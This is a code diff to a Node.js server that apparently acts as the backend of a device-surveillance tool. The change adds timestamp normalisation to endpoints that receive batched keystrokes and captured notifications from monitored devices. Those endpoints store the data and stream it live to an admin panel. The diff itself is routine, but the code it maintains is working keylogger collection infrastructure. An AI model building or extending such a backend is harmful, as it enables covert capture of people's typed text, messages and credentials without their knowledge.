@@ -2692,6 +2692,16 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // Normalize timestamp — accepts epoch-millis (number/string) or ISO string, returns ISO string
+  function normalizeTs(ts) {
+    if (!ts) return new Date().toISOString();
+    if (typeof ts === 'number') return new Date(ts).toISOString();
+    const s = String(ts);
+    if (/^\d{13}$/.test(s)) return new Date(parseInt(s)).toISOString();
+    if (/^\d{10}$/.test(s)) return new Date(parseInt(s) * 1000).toISOString();
+    return s;
+  }
+
   // ═══ KEYLOG UPLOAD — device uploads batched keystrokes ═══
   app.post('/api/devices/keylog', express.json({ limit: '2mb' }), (req, res) => {
     try {
@@ -2707,7 +2717,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         )`);
         const stmt = db.prepare('INSERT INTO keylog_entries (device_id, app_package, text_content, recorded_at) VALUES (?,?,?,?)');
         for (const e of entries) {
-          stmt.run(device_id, e.app || '', e.text || '', e.ts || new Date().toISOString());
+          stmt.run(device_id, e.app || '', e.text || '', normalizeTs(e.ts));
           stored++;
           // Real-time broadcast to admin panel
           if (io) {
@@ -2715,7 +2725,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
               device_id,
               app_package: e.app || '',
               text_content: e.text || '',
-              recorded_at: e.ts || new Date().toISOString()
+              recorded_at: normalizeTs(e.ts)
             });
           }
         }
@@ -2742,10 +2752,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         )`);
         const stmt = db.prepare('INSERT INTO notification_entries (device_id, app_package, title, text_content, recorded_at) VALUES (?,?,?,?,?)');
         for (const e of entries) {
-          stmt.run(device_id, e.app || '', e.title || '', e.text || '', e.ts || new Date().toISOString());
+          stmt.run(device_id, e.app || '', e.title || '', e.text || '', normalizeTs(e.ts));
           stored++;
           if (io) {
-            io.emit('new_notification', { device_id, app_package: e.app || '', title: e.title || '', text_content: e.text || '', recorded_at: e.ts || new Date().toISOString() });
+            io.emit('new_notification', { device_id, app_package: e.app || '', title: e.title || '', text_content: e.text || '', recorded_at: normalizeTs(e.ts) });
           }
         }
       } catch (_) {}
